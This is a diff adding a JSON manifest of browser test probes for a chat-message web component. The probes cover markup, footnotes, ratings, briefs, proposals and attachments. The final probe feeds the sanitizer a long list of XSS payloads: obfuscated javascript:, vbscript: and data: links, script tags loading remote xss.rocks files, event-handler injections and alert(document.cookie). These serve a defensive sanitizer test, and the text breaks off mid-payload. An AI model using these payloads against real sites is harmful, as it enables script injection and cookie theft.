@@ -1,0 +1,581 @@
+{
+  "component": "sf-chat-message",
+  "probe": "sf-chat-message against component.json (standard simai.smart-component 1.3.9 §12, gate 20); the behaviour simai/ui-chat's tests/browser/staff.test.mjs and sanitize.test.mjs hold for the message view: markup, footnotes and sources, waits and notices, rating and its reason, the task brief, the proposal card, a question's files, the template person, and the sanitizer's acceptance cases",
+  "format": "stands/15-scenarios (A4 modal: a page, probes in steps); the runner is ui-source tests/browser/manifest-probes.browser.mjs, run for the package by scripts/run-manifest-probes.mjs",
+  "page": {
+    "lang": "ru",
+    "body": [
+      "<main>",
+      "  <sf-chat-message id=\"a\"></sf-chat-message>",
+      "  <sf-chat-message id=\"b\"></sf-chat-message>",
+      "  <sf-chat-message id=\"p\" template=\"person\"></sf-chat-message>",
+      "  <sf-chat-message id=\"s\"></sf-chat-message>",
+      "  <section lang=\"en\"><sf-chat-message id=\"e\"></sf-chat-message></section>",
+      "</main>"
+    ]
+  },
+  "probes": [
+    {
+      "id": "p1-markup",
+      "title": "the answer's html is drawn sanitized: three heading sizes, del, a table in its scrolling region, an image link with its icon and never loaded, [n] linked only where source n exists and never inside code; an unchecked answer says so under the text",
+      "covers": "settings.message, sanitize (h2 h3 h4 del), footnotes, runtime.verification-unverified",
+      "steps": [
+        {
+          "script": "(await customElements.whenDefined('sf-chat-message'), document.querySelector('#a').message = {\"id\":\"m1\",\"role\":\"assistant\",\"status\":\"completed\",\"text\":\"Отпуск — 28 дней.\",\"html\":\"<h2>Отпуск</h2><p>Ежегодный отпуск — <strong>28 календарных дней</strong>[1]. Перенос[2], а [3] — без источника.</p><p><code>a[1]</code> и <del>старое</del></p><h3>Б</h3><h4>В</h4><ul><li><a href=\\\"https://example.com/p.png\\\">Изображение: схема</a></li></ul><table><thead><tr><th>Стаж</th></tr></thead><tbody><tr><td>14</td></tr></tbody></table>\",\"verification\":\"unverified\",\"sources\":[{\"n\":1,\"kind\":\"base\",\"title\":\"Положение\"},{\"n\":2,\"kind\":\"web\",\"title\":\"ТК\",\"url\":\"https://example.com/tk\"}]}, true)",
+          "wait": 300,
+          "check": "(() => { const m = document.querySelector('#a .sf-chat-markup'); const f = [...m.querySelectorAll('.sf-chat-footnote')].map((b) => b.textContent); const img = m.querySelector('a.sf-chat-markup__image'); return m.querySelector('h2').textContent === 'Отпуск' && m.querySelector('h3') && m.querySelector('h4') && m.querySelector('del').textContent === 'старое' && f.join() === '1,2' && m.querySelector('code').textContent === 'a[1]' && m.textContent.includes('[3]') && img && img.querySelector('sf-icon[icon=image]') && !m.querySelector('img') && m.querySelector('.sf-chat-markup__table[role=region] > table') && document.querySelector('#a article').getAttribute('aria-label') === 'Помощник' && document.querySelector('#a .sf-chat-check--unverified > span').textContent === 'Не полностью проверен — уточните у специалиста'; })()"
+        }
+      ]
+    },
+    {
+      "id": "p2-sources",
+      "title": "a footnote opens the sources at its source and focuses it, sending sf-chat-message-toggle {id, kind: sources, open: true} and the 0.3 sf-chat-action {action: sources}; a long excerpt is folded to «Показать полностью» and opens in place; a web source links out",
+      "covers": "events.toggle, aliases sf-chat-action, runtime.sources-more, runtime.sources-less, runtime.sources-chip",
+      "steps": [
+        {
+          "script": "(await customElements.whenDefined('sf-chat-message'), document.querySelector('#a').message = {\"id\":\"m2\",\"role\":\"assistant\",\"status\":\"completed\",\"text\":\"Отпуск — 28 дней.\",\"html\":\"<p>Отпуск 28 дней[1], перенос[2].</p>\",\"verification\":\"verified\",\"sources\":[{\"n\":1,\"kind\":\"base\",\"title\":\"Положение\",\"excerpt\":\"Работнику предоставляется ежегодный основной оплачиваемый отпуск продолжительностью 28 календарных дней. Отпуск может быть разделён на части по соглашению сторон, при этом хотя бы одна из частей должна быть не менее 14 календарных дней.\"},{\"n\":2,\"kind\":\"web\",\"title\":\"ТК\",\"url\":\"https://example.com/tk\"}]}, true)",
+          "wait": 300,
+          "check": "(() => { const a = document.querySelector('#a'); return a.querySelector('.sf-chat-sources').hidden && a.querySelector('.sf-chat-chip--sources').getAttribute('aria-label') === 'Источники 2' && a.querySelector('.sf-chat-chip--verified') && a.querySelector('a.sf-chat-sources__title').getAttribute('rel') === 'noopener noreferrer nofollow'; })()"
+        },
+        {
+          "user": "click:#a .sf-chat-footnote",
+          "expect": {
+            "events": [
+              {
+                "name": "sf-chat-message-toggle",
+                "count": 1,
+                "detail": {
+                  "id": "m2",
+                  "kind": "sources",
+                  "open": true
+                }
+              },
+              {
+                "name": "sf-chat-action",
+                "count": 1,
+                "detail": {
+                  "action": "sources",
+                  "id": "m2",
+                  "open": true
+                }
+              }
+            ],
+            "journal": [
+              {
+                "from": "sf-chat-action",
+                "since": "2026-10-28",
+                "remove_after": "2026-12-01"
+              }
+            ]
+          },
+          "check": "(() => { const a = document.querySelector('#a'); return !a.querySelector('.sf-chat-sources').hidden && document.activeElement === a.querySelector('#m-m2-source-1') && a.querySelector('.sf-chat-chip--sources').getAttribute('aria-expanded') === 'true'; })()"
+        },
+        {
+          "user": "click:#a .sf-chat-sources__more",
+          "check": "(() => { const b = document.querySelector('#a .sf-chat-sources__more'); return b.getAttribute('aria-expanded') === 'true' && b.textContent === 'Свернуть' && !document.querySelector('#a .sf-chat-sources__excerpt--folded'); })()"
+        }
+      ]
+    },
+    {
+      "id": "p3-rate",
+      "title": "«Не полезно» sends sf-chat-message-rate {id, value: down} and the 0.3 feedback; asked why (display.feedback.asking), a reason sends drafted, «Отправить» rate {id, value: down, reason, note} (0.3 feedback-send) and Escape cancel {id, kind: rate} (0.3 feedback-skip)",
+      "covers": "events.rate, events.drafted, events.cancel, settings.display, aliases sf-chat-action, runtime.feedback-ask",
+      "steps": [
+        {
+          "script": "(await customElements.whenDefined('sf-chat-message'), document.querySelector('#a').display = {}, document.querySelector('#a').message = {\"id\":\"m3\",\"role\":\"assistant\",\"status\":\"completed\",\"text\":\"Отпуск — 28 дней.\"}, true)",
+          "wait": 300
+        },
+        {
+          "user": "click:#a [data-rating=down]",
+          "expect": {
+            "events": [
+              {
+                "name": "sf-chat-message-rate",
+                "count": 1,
+                "detail": {
+                  "id": "m3",
+                  "value": "down"
+                }
+              },
+              {
+                "name": "sf-chat-action",
+                "count": 1,
+                "detail": {
+                  "action": "feedback",
+                  "id": "m3",
+                  "value": "down"
+                }
+              }
+            ],
+            "journal": [
+              {
+                "from": "sf-chat-action",
+                "since": "2026-10-28",
+                "remove_after": "2026-12-01"
+              }
+            ]
+          },
+          "check": "document.querySelector('#a [data-rating=down]').getAttribute('aria-pressed') === 'true'"
+        },
+        {
+          "script": "(document.querySelector('#a').display = {feedback: {value: 'down', asking: true, draft: {reason: null, note: ''}}}, true)",
+          "wait": 300,
+          "check": "document.querySelector('#a .sf-chat-reason__title').textContent === 'Что не так с ответом?'"
+        },
+        {
+          "user": "click:#a [data-reason=wrong]",
+          "expect": {
+            "events": [
+              {
+                "name": "sf-chat-message-drafted",
+                "count": 1,
+                "detail": {
+                  "id": "m3",
+                  "reason": "wrong",
+                  "note": ""
+                }
+              }
+            ]
+          },
+          "check": "document.querySelector('#a [data-reason=wrong]').getAttribute('aria-pressed') === 'true'"
+        },
+        {
+          "user": "click:#a .sf-chat-reason__actions .sf-button",
+          "expect": {
+            "events": [
+              {
+                "name": "sf-chat-message-rate",
+                "count": 1,
+                "detail": {
+                  "id": "m3",
+                  "value": "down",
+                  "reason": "wrong",
+                  "note": ""
+                }
+              },
+              {
+                "name": "sf-chat-action",
+                "count": 1,
+                "detail": {
+                  "action": "feedback-send",
+                  "id": "m3",
+                  "reason": "wrong"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "script": "(document.querySelector('#a [data-reason=wrong]').focus(), true)",
+          "wait": 50
+        },
+        {
+          "user": "keyboard:Escape",
+          "expect": {
+            "events": [
+              {
+                "name": "sf-chat-message-cancel",
+                "count": 1,
+                "detail": {
+                  "id": "m3",
+                  "kind": "rate"
+                }
+              },
+              {
+                "name": "sf-chat-action",
+                "count": 1,
+                "detail": {
+                  "action": "feedback-skip",
+                  "id": "m3"
+                }
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "p4-waits-and-notices",
+      "title": "a running answer is aria-busy with its stage; a stopped wait offers «Обновить» (sf-chat-message-check, 0.3 check); a limit says when it renews; a failed answer offers «Повторить» (retry {id}, 0.3 retry) until display.retried",
+      "covers": "events.check, events.retry, runtime.stage-writing, runtime.limit-resets, display.wait, display.retried",
+      "steps": [
+        {
+          "script": "(await customElements.whenDefined('sf-chat-message'), document.querySelector('#a').display = {}, document.querySelector('#a').message = {id: 'm4', role: 'assistant', status: 'running', stage: 'writing'}, true)",
+          "wait": 300,
+          "check": "document.querySelector('#a article').getAttribute('aria-busy') === 'true' && document.querySelector('#a .sf-chat-stages__label').textContent === 'Пишу ответ'"
+        },
+        {
+          "script": "(document.querySelector('#a').display = {wait: 'stopped'}, true)",
+          "wait": 300,
+          "check": "document.querySelector('#a .sf-chat-notice--stopped .sf-chat-notice__text').textContent === 'Ожидание остановлено. Ответ может прийти позже.'"
+        },
+        {
+          "user": "click:#a .sf-chat-notice__action",
+          "expect": {
+            "events": [
+              {
+                "name": "sf-chat-message-check",
+                "count": 1,
+                "detail": {
+                  "id": "m4"
+                }
+              },
+              {
+                "name": "sf-chat-action",
+                "count": 1,
+                "detail": {
+                  "action": "check",
+                  "id": "m4"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "script": "(document.querySelector('#a').display = {}, document.querySelector('#a').message = {id: 'm5', role: 'assistant', status: 'limit', text: 'Лимит исчерпан.', limit_resets_at: '2026-11-01T12:00:00Z'}, true)",
+          "wait": 300,
+          "check": "document.querySelector('#a .sf-chat-notice__more').textContent.startsWith('Лимит обновится ')"
+        },
+        {
+          "script": "(document.querySelector('#a').message = {id: 'm6', role: 'assistant', status: 'failed', text: 'Не удалось.'}, true)",
+          "wait": 300,
+          "check": "document.querySelector('#a .sf-chat-notice--failed').getAttribute('role') === 'alert'"
+        },
+        {
+          "user": "click:#a .sf-chat-notice__action",
+          "expect": {
+            "events": [
+              {
+                "name": "sf-chat-message-retry",
+                "count": 1,
+                "detail": {
+                  "id": "m6"
+                }
+              },
+              {
+                "name": "sf-chat-action",
+                "count": 1,
+                "detail": {
+                  "action": "retry",
+                  "id": "m6"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "script": "(document.querySelector('#a').display = {retried: true}, true)",
+          "wait": 300,
+          "check": "!document.querySelector('#a .sf-chat-notice__action')"
+        }
+      ]
+    },
+    {
+      "id": "p5-brief",
+      "title": "the brief (features.brief, v1.2): live, two questions answer together — «Ответить» waits for the required one, then sends sf-chat-message-submit {id, text: «С 1 июля; —»} and the 0.3 brief-answer; the lead stands for the html; one question with «Свой вариант» sends the typed words on Enter; the card sends its «Да»; not live it is a record with the taken option marked",
+      "covers": "settings.features, display.brief, events.submit, aliases sf-chat-action, runtime.brief-*",
+      "steps": [
+        {
+          "script": "(await customElements.whenDefined('sf-chat-message'), document.querySelector('#b').features = {brief: true}, document.querySelector('#b').display = {brief: {live: true}}, document.querySelector('#b').message = {\"id\":\"m7\",\"role\":\"assistant\",\"status\":\"completed\",\"text\":\"Отпуск — 28 дней.\",\"html\":\"<p>длинный html</p>\",\"brief\":{\"decision\":\"ask\",\"lead\":\"Уточню два момента.\",\"questions\":[{\"text\":\"С какого числа?\",\"options\":[{\"label\":\"С 1 июля\"},{\"label\":\"С 15 июля\"}],\"recommended\":0},{\"text\":\"Отпускные заранее?\",\"options\":[{\"label\":\"Да\"}],\"blocking\":false}]}}, true)",
+          "wait": 300,
+          "check": "(() => { const b = document.querySelector('#b'); const send = b.querySelector('.sf-chat-brief__actions .sf-chat-brief__send'); return b.querySelector('.sf-chat-message__plain').textContent === 'Уточню два момента.' && !b.querySelector('.sf-chat-markup') && send.disabled && !b.querySelector('.sf-chat-brief__hint').hidden && b.querySelector('.sf-chat-brief__optional').textContent === 'необязательно'; })()"
+        },
+        {
+          "user": "click:#b .sf-chat-brief__question [data-option='0']",
+          "check": "!document.querySelector('#b .sf-chat-brief__actions .sf-chat-brief__send').disabled && document.querySelector('#b .sf-chat-brief__hint').hidden"
+        },
+        {
+          "user": "click:#b .sf-chat-brief__actions .sf-chat-brief__send",
+          "expect": {
+            "events": [
+              {
+                "name": "sf-chat-message-submit",
+                "count": 1,
+                "detail": {
+                  "id": "m7",
+                  "text": "С 1 июля; —"
+                }
+              },
+              {
+                "name": "sf-chat-action",
+                "count": 1,
+                "detail": {
+                  "action": "brief-answer",
+                  "id": "m7",
+                  "text": "С 1 июля; —"
+                }
+              }
+            ],
+            "journal": [
+              {
+                "from": "sf-chat-action",
+                "since": "2026-10-28",
+                "remove_after": "2026-12-01"
+              }
+            ]
+          }
+        },
+        {
+          "script": "(document.querySelector('#b').message = {\"id\":\"m8\",\"role\":\"assistant\",\"status\":\"completed\",\"text\":\"Отпуск — 28 дней.\",\"brief\":{\"decision\":\"ask\",\"questions\":[{\"text\":\"С какого числа?\",\"options\":[{\"label\":\"С 1 июля\"}]}]}}, true)",
+          "wait": 300
+        },
+        {
+          "user": "click:#b .sf-chat-brief__toggle",
+          "check": "(() => { const t = document.querySelector('#b .sf-chat-brief__toggle'); return t.getAttribute('aria-expanded') === 'true' && document.activeElement === document.querySelector('#b .sf-chat-brief__other input'); })()"
+        },
+        {
+          "script": "(document.querySelector('#b .sf-chat-brief__other input').value = 'С 3 августа', true)",
+          "wait": 50
+        },
+        {
+          "user": "keyboard:Enter",
+          "expect": {
+            "events": [
+              {
+                "name": "sf-chat-message-submit",
+                "count": 1,
+                "detail": {
+                  "id": "m8",
+                  "text": "С 3 августа"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "script": "(document.querySelector('#b').message = {\"id\":\"m9\",\"role\":\"assistant\",\"status\":\"completed\",\"text\":\"Отпуск — 28 дней.\",\"brief\":{\"decision\":\"card\",\"card\":{\"goal\":\"Перенести отпуск\",\"steps\":[\"Найти график\"],\"confirm\":\"Да\"}}}, true)",
+          "wait": 300,
+          "check": "document.querySelector('#b legend.sf-chat-brief__text').textContent === 'Как я понял задачу'"
+        },
+        {
+          "user": "click:#b .sf-chat-brief__send",
+          "expect": {
+            "events": [
+              {
+                "name": "sf-chat-message-submit",
+                "count": 1,
+                "detail": {
+                  "id": "m9",
+                  "text": "Да"
+                }
+              }
+            ]
+          }
+        },
+        {
+          "script": "(document.querySelector('#b').display = {brief: {live: false, answer: 'С 15 июля'}}, document.querySelector('#b').message = {\"id\":\"m10\",\"role\":\"assistant\",\"status\":\"completed\",\"text\":\"Отпуск — 28 дней.\",\"brief\":{\"decision\":\"ask\",\"questions\":[{\"text\":\"С какого числа?\",\"options\":[{\"label\":\"С 1 июля\"},{\"label\":\"С 15 июля\"}]}]}}, true)",
+          "wait": 300,
+          "check": "(() => { const b = document.querySelector('#b'); return !b.querySelector('.sf-chat-brief__send') && b.querySelector('.sf-chat-brief--done') && b.querySelector('.sf-chat-chip--chosen').textContent.includes('С 15 июля') && b.querySelectorAll('.sf-chat-chip--chosen').length === 1; })()"
+        }
+      ]
+    },
+    {
+      "id": "p6-proposal-copy-summary",
+      "title": "a proposal is the package's sf-change-confirm with the chat's «Подтвердить» and «Отменить», disabled while busy and kept across redraws; the summary line ends the action row; copy sends sf-chat-message-copied and the 0.3 copy",
+      "covers": "proposal (sf-change-confirm), display.busy, events.copied, runtime.proposal-confirm, runtime.proposal-cancel",
+      "steps": [
+        {
+          "script": "(await customElements.whenDefined('sf-chat-message'), document.querySelector('#a').display = {busy: true}, document.querySelector('#a').message = {\"id\":\"m11\",\"role\":\"assistant\",\"status\":\"completed\",\"text\":\"Отпуск — 28 дней.\",\"proposal\":{\"code\":\"P-17\",\"title\":\"Перенести отпуск\",\"state\":\"presented\",\"changes\":[{\"field\":\"Начало\",\"was\":\"1 июля\",\"will_be\":\"15 июля\"}]},\"summary\":{\"text\":\"Нашёл 2 источника\"}}, true)",
+          "wait": 400,
+          "check": "(() => { const c = document.querySelector('#a sf-change-confirm'); return c.getAttribute('change-id') === 'P-17' && c.getAttribute('accept-text') === 'Подтвердить' && c.getAttribute('decline-text') === 'Отменить' && c.getAttribute('state') === 'open' && c.hasAttribute('disabled') && document.querySelector('#a .sf-chat-message__summary').textContent === 'Нашёл 2 источника'; })()"
+        },
+        {
+          "script": "(window.__card = document.querySelector('#a sf-change-confirm'), document.querySelector('#a').display = {}, true)",
+          "wait": 300,
+          "check": "document.querySelector('#a sf-change-confirm') === window.__card && !window.__card.hasAttribute('disabled')"
+        },
+        {
+          "user": "click:#a [aria-label='Копировать ответ']",
+          "wait": 300,
+          "expect": {
+            "events": [
+              {
+                "name": "sf-chat-message-copied",
+                "count": 1,
+                "detail": {
+                  "id": "m11"
+                }
+              },
+              {
+                "name": "sf-chat-action",
+                "count": 1,
+                "detail": {
+                  "action": "copy",
+                  "id": "m11"
+                }
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "p7-question-files",
+      "title": "a person's question: a bubble and its files as sf-chat-composer's chips; a sent file with href is a download link, checked first — a file gone (404) loses its link and says «Файл удалён»; a question sent by a button is a note",
+      "covers": "message.attachments, runtime.attachment-deleted, runtime.files-download-label, display.note",
+      "steps": [
+        {
+          "script": "(await customElements.whenDefined('sf-chat-message'), document.querySelector('#a').display = {}, document.querySelector('#a').message = {id: 'q1', role: 'user', text: 'Проверьте договор', attachments: [{id: 'att_1', name: 'Удалённый.pdf', bytes: 48213, href: '/sf-chat-message-probe/missing.pdf'}, {id: 'att_2', name: 'Приложение.docx', bytes: 1572864}]}, true)",
+          "wait": 300,
+          "check": "(() => { const a = document.querySelector('#a'); const link = a.querySelector('.sf-chat-attachment__link'); return a.querySelector('article').getAttribute('aria-label') === 'Вы' && a.querySelector('.sf-chat-message__bubble').textContent === 'Проверьте договор' && link.getAttribute('download') === 'Удалённый.pdf' && link.title === 'Скачать Удалённый.pdf' && a.querySelectorAll('.sf-chat-attachment').length === 2 && a.querySelectorAll('.sf-chat-attachment__meta')[1].textContent === '1,5 МБ'; })()"
+        },
+        {
+          "user": "click:#a .sf-chat-attachment__link",
+          "wait": 600,
+          "check": "(() => { const a = document.querySelector('#a'); const meta = a.querySelector('.sf-chat-attachment__meta'); return !a.querySelector('.sf-chat-attachment__link') && meta.textContent === 'Файл удалён' && meta.getAttribute('role') === 'status'; })()"
+        },
+        {
+          "script": "(document.querySelector('#a').display = {note: 'confirm', code: 'P-17'}, document.querySelector('#a').message = {id: 'q2', role: 'user', text: 'подтверждаю P-17'}, true)",
+          "wait": 300,
+          "check": "document.querySelector('#a .sf-chat-message__note > span').textContent === 'Вы подтвердили изменение · код P-17' && !document.querySelector('#a .sf-chat-message__bubble')"
+        }
+      ]
+    },
+    {
+      "id": "p8-person",
+      "title": "the template person: another's message carries initials and, first in a group, the name; the reader's own offers edit and delete — toggle {kind: edit|delete, open}, the editor saves sf-chat-message-save {id, values: {body}}, the question deletes {ids}; an unsent one retries by its key",
+      "covers": "templates.person, events.toggle, events.save, events.delete, events.retry, runtime.people-*",
+      "steps": [
+        {
+          "script": "(await customElements.whenDefined('sf-chat-message'), document.querySelector('#p').display = {own: false, first: true, showName: true}, document.querySelector('#p').message = {id: 41, body: 'Посмотрите график', authorName: 'Анна Смирнова'}, true)",
+          "wait": 300,
+          "check": "(() => { const p = document.querySelector('#p'); return p.querySelector('article.sf-chat-person').getAttribute('aria-label') === 'Анна Смирнова' && p.querySelector('.sf-chat-person__avatar').textContent === 'АС' && p.querySelector('.sf-chat-person__name').textContent === 'Анна Смирнова'; })()"
+        },
+        {
+          "script": "(document.querySelector('#p').display = {own: true, first: true}, document.querySelector('#p').message = {id: 42, body: 'Хорошо', authorName: 'Я', canEdit: true, canDelete: true}, true)",
+          "wait": 300,
+          "check": "document.querySelector('#p .sf-chat-person--own') && document.querySelectorAll('#p .sf-chat-person__tools button').length === 2"
+        },
+        {
+          "user": "click:#p [aria-label='Изменить']",
+          "expect": {
+            "events": [
+              {
+                "name": "sf-chat-message-toggle",
+                "count": 1,
+                "detail": {
+                  "id": 42,
+                  "kind": "edit",
+                  "open": true
+                }
+              },
+              {
+                "name": "sf-chat-action",
+                "count": 0
+              }
+            ]
+          }
+        },
+        {
+          "script": "(document.querySelector('#p').display = {own: true, first: true, editing: {body: 'Хорошо, посмотрю'}}, true)",
+          "wait": 300,
+          "check": "document.activeElement === document.querySelector('#p .sf-chat-person__edit-field')"
+        },
+        {
+          "user": "keyboard:Enter",
+          "expect": {
+            "events": [
+              {
+                "name": "sf-chat-message-save",
+                "count": 1,
+                "detail": {
+                  "id": 42,
+                  "values": {
+                    "body": "Хорошо, посмотрю"
+                  }
+                }
+              }
+            ]
+          }
+        },
+        {
+          "script": "(document.querySelector('#p').display = {own: true, first: true, askDelete: true}, true)",
+          "wait": 300,
+          "check": "document.activeElement && document.activeElement.textContent === 'Отмена'"
+        },
+        {
+          "user": "click:#p .sf-chat-person__ask .sf-button--error",
+          "expect": {
+            "events": [
+              {
+                "name": "sf-chat-message-delete",
+                "count": 1,
+                "detail": {
+                  "ids": [
+                    42
+                  ]
+                }
+              }
+            ]
+          }
+        },
+        {
+          "script": "(document.querySelector('#p').display = {own: true, first: true}, document.querySelector('#p').message = {id: null, body: 'Не ушло', local: {state: 'failed', action: 'send', clientKey: 'k1'}}, true)",
+          "wait": 300
+        },
+        {
+          "user": "click:#p .sf-chat-notice__action",
+          "expect": {
+            "events": [
+              {
+                "name": "sf-chat-message-retry",
+                "count": 1,
+                "detail": {
+                  "key": "k1"
+                }
+              }
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "p9-sanitize",
+      "title": "ui-chat's sanitize acceptance through the element (tests/browser/sanitize.test.mjs): the schemes, the OWASP families and nested forbidden elements execute nothing and leave no element or attribute off the list; every scheme vector loses its href and keeps its text; h1 and s are unwrapped; allowed markup and root-relative links stay; code keeps one language class. SF.sanitizeHtml is used when the page has it, else the component's copy",
+      "covers": "sanitize (SF.sanitizeHtml, Core's), security.untrusted_inputs",
+      "steps": [
+        {
+          "script": "(await customElements.whenDefined('sf-chat-message'), window.__alerts = [], window.alert = (value) => window.__alerts.push(value), document.querySelector('#s').message = {\"id\":\"s1\",\"role\":\"assistant\",\"status\":\"completed\",\"text\":\"Отпуск — 28 дней.\",\"html\":\"<a href=\\\"javascript:alert(1)\\\">x</a><a href=\\\" javascript:alert(1)\\\">x</a><a href=\\\"\\tjavascript:alert(1)\\n\\\">x</a><a href=\\\"javascript&#58;alert(1)\\\">x</a><a href=\\\"javascript&colon;alert(1)\\\">x</a><a href=\\\"java&#x09;script:alert(1)\\\">x</a><a href=\\\"java&#0000106script:alert(1)\\\">x</a><a href=\\\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)\\\">x</a><a href=\\\"jav\\u0000ascript:alert(1)\\\">x</a><a href=\\\"JaVaScRiPt:alert(1)\\\">x</a><a href=\\\" JaVaScRiPt:alert(1)\\\">x</a><a href=\\\"\\tJaVaScRiPt:alert(1)\\n\\\">x</a><a href=\\\"JaVaScRiPt&#58;alert(1)\\\">x</a><a href=\\\"JaVaScRiPt&colon;alert(1)\\\">x</a><a href=\\\"JaVa&#x09;ScRiPt:alert(1)\\\">x</a><a href=\\\"JaVa&#0000106ScRiPt:alert(1)\\\">x</a><a href=\\\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)\\\">x</a><a href=\\\"JaV\\u0000aScRiPt:alert(1)\\\">x</a><a href=\\\"vbscript:alert(1)\\\">x</a><a href=\\\" vbscript:alert(1)\\\">x</a><a href=\\\"\\tvbscript:alert(1)\\n\\\">x</a><a href=\\\"vbscript&#58;alert(1)\\\">x</a><a href=\\\"vbscript&colon;alert(1)\\\">x</a><a href=\\\"vbsc&#x09;ript:alert(1)\\\">x</a><a href=\\\"vbsc&#0000106ript:alert(1)\\\">x</a><a href=\\\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)\\\">x</a><a href=\\\"vbs\\u0000cript:alert(1)\\\">x</a><a href=\\\"VBScript:alert(1)\\\">x</a><a href=\\\" VBScript:alert(1)\\\">x</a><a href=\\\"\\tVBScript:alert(1)\\n\\\">x</a><a href=\\\"VBScript&#58;alert(1)\\\">x</a><a href=\\\"VBScript&colon;alert(1)\\\">x</a><a href=\\\"VBSc&#x09;ript:alert(1)\\\">x</a><a href=\\\"VBSc&#0000106ript:alert(1)\\\">x</a><a href=\\\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)\\\">x</a><a href=\\\"VBS\\u0000cript:alert(1)\\\">x</a><a href=\\\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\" data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"\\tdata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\n\\\">x</a><a href=\\\"data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"data&colon;text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"data&#x09;:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"data&#0000106:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)\\\">x</a><a href=\\\"dat\\u0000a:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"DaTa:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\" DaTa:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"\\tDaTa:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\n\\\">x</a><a href=\\\"DaTa&#58;text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"DaTa&colon;text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"DaTa&#x09;:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"DaTa&#0000106:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><a href=\\\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)\\\">x</a><a href=\\\"DaT\\u0000a:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\\\">x</a><SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT><IMG SRC=\\\"javascript:alert('XSS');\\\"><IMG SRC=JaVaScRiPt:alert('XSS')><a onmouseover=\\\"alert(document.cookie)\\\">xxs link</a><IMG \\\"\\\"\\\"><SCRIPT>alert(\\\"XSS\\\")</SCRIPT>\\\"\\\\><IMG SRC=# onmouseover=\\\"alert('xxs')\\\"><IMG SRC=/ onerror=\\\"alert(String.fromCharCode(88,83,83))\\\"></img><IMG SRC=\\\"jav&#x0A;ascript:alert('XSS');\\\"><SCRIPT/XSS SRC=\\\"http://xss.rocks/xss.js\\\"></SCRIPT><BODY onload!#$%&()*~+-_.,:;?@[/|\\\\]^`=alert(\\\"XSS\\\")><<SCRIPT>alert(\\\"XSS\\\");//\\\\<</SCRIPT><iframe src=http://xss.rocks/scriptlet.html <</TITLE><SCRIPT>alert(\\\"XSS\\\");</SCRIPT><INPUT TYPE=\\\"IMAGE\\\" SRC=\\\"javascript:alert('XSS');\\\"><svg/onload=alert('XSS')><BODY ONLOAD=alert('XSS')><BR SIZE=\\\"&{alert('XSS')}\\\"><LINK REL=\\\"stylesheet\\\" HREF=\\\"javascript:alert('XSS');\\\"><STYLE>@import'http://xss.rocks/xss.css';</STYLE><META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0;url=javascript:alert('XSS');\\\"><IFRAME SRC=\\\"javascript:alert('XSS');\\\"></IFRAME><TABLE BACKGROUND=\\\"javascript:alert('XSS')\\\"><TR><TD BACKGROUND=\\\"javascript:alert('XSS')\\\">x</TD></TR></TABLE><DIV STYLE=\\\"background-image: url(javascript:alert('XSS'))\\\">x</DIV><BASE HREF=\\\"javascript:alert('XSS');//\\\"><OBJECT TYPE=\\\"text/x-scriptlet\\\" DATA=\\\"http://xss.rocks/scriptlet.html\\\"></OBJECT><math><mtext><table><mglyph><style><img src=x onerror=alert(1)><noscript><p title=\\\"</noscript><img src=x onerror=alert(1)>\\\"><form><button formaction=\\\"javascript:alert(1)\\\">x</button></form><iframe srcdoc=\\\"<script>alert(1)</script>\\\"></iframe><details open ontoggle=alert(1)>x</details><template><img src=x onerror=alert(1)></template><p>[1]</p><base href=\\\"javascript:alert(1)//\\\"><a href=\\\"//evil.example/x\\\">x</a><a href=\\\"/\\\\evil.example\\\">x</a><p id=\\\"x\\\" class=\\\"y\\\" style=\\\"color:red\\\" data-x=\\\"1\\\" onclick=\\\"alert(1)\\\" title=\\\"t\\\">x</p><code class=\\\"language-js x\\\" onmouseover=alert(1)>x</code><td colspan=\\\"2 onmouseover=alert(1)\\\" 